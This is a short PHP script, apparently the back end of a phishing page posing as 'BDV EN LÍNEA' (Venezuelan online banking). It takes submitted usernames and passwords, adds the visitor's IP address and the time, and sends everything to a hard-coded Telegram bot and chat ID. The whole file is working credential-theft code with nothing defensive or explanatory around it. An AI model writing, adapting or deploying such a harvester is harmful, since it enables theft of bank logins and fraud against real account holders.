<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// Verificar que sea una petición POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Recibir datos
    $usuario = isset($_POST['usuario']) ? $_POST['usuario'] : 'no data';
    $password = isset($_POST['password']) ? $_POST['password'] : 'no data';
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d H:i:s');

    // Configuración Telegram
    $token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
    $chat_id = "6912929677";

    // Crear mensaje
    $mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
    $mensaje .= "👤 Usuario: $usuario\n";
    $mensaje .= "🔑 Clave: $password\n";
    $mensaje .= "🌐 IP: $ip\n";
    $mensaje .= "📅 Fecha: $fecha\n";
    $mensaje .= "\n═══════════════════\n";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = array(
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    );

    // Hacer la petición a Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Responder al cliente
    echo json_encode(["success" => true]);
} else {
    // Si no es POST, responder error
    echo json_encode(["success" => false, "error" => "Método no permitido"]);
}
?> 